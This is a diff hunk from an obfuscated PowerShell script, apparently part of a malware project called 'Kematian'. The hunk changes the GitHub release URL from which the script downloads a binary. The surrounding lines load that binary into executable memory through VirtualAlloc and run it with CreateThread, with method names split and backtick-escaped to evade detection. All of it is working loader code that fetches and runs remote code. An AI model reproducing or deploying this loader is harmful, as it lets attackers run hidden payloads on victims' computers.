@@ -15,7 +15,7 @@ function kematian_delegates {
     $type.(('d'+'eFin')+'e'+('Met'+'hOD')).Invoke('Invoke', ('P'+'ubl'+'ic,'+' HideB'+'ySig, '+'N'+'ew'+'Slot, Virtu'+'al'), $delType, $func).(('s'+'Et')+'i'+('MP'+'L')+'eM'+('e'+'Ntati'+'Onf')+'La'+'gs').Invoke(('R'+'untime,'+' Mana'+'ged'))
     return $type.(('Cr'+'E')+('at'+'eT')+'y'+'pE').Invoke()
 }
-$kematianthegreat = (New-Object net.webclient).DownloadData("https://github.com/macedonianlegend/Kematian/releases/download/7zrBuild/7zr.bin")
+$kematianthegreat = (New-Object net.webclient).DownloadData("https://github.com/Pirate-Devs/Kematian/releases/download/7zrBuild/7zr.bin")
 $lpMem = [System.Runtime.InteropServices.Marshal]::('G'+('Etde'+'Le'+'ga')+('TEFo'+'r')+('fu'+'N')+'c'+('ti'+'Onp')+('OIN'+'T'+'ER')).Invoke((KematianLoader kernel32.dll VirtualAlloc), (kematian_delegates @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr])))."IN`VOke"([IntPtr]::"zE`RO", $kematianthegreat."l`EnGTh", 0x3000, 0x40)
 [System.Runtime.InteropServices.Marshal]::('Co'+'pY').Invoke($kematianthegreat, 0, $lpMem, $kematianthegreat."Le`N`GtH")
 $hThread = [System.Runtime.InteropServices.Marshal]::('ge'+('Tde'+'L')+('E'+'gatE')+'Fo'+'R'+('func'+'TI'+'oNp')+'oi'+'NT'+'eR').Invoke((KematianLoader kernel32.dll CreateThread), (kematian_delegates @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr])))."Invo`Ke"([IntPtr]::"ZE`Ro", 0, $lpMem, [IntPtr]::"ze`Ro", 0, [IntPtr]::"zE`Ro")
